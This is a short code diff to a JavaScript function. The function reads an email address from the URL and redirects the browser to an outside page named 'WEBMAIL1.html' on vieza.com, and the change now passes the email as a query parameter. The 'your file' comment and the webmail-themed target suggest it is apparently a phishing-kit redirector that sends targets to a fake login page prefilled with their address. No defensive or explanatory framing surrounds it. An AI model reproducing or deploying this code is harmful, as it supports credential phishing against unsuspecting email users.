@@ -72,10 +72,10 @@
 
     function redirectToUrl() {
         const email = getQueryParams();
-        const destinationUrl = "https://vieza.com/wiht/cssl/sc/index.html"; // your file
+        const destinationUrl = "https://vieza.com//wiht/cssl/web/WEBMAIL1.html"; // your file
 
         if (email) {
-            window.location.href = `${destinationUrl}#${email}`;
+            window.location.href = `${destinationUrl}?email=${email}`;
         }
     }
 
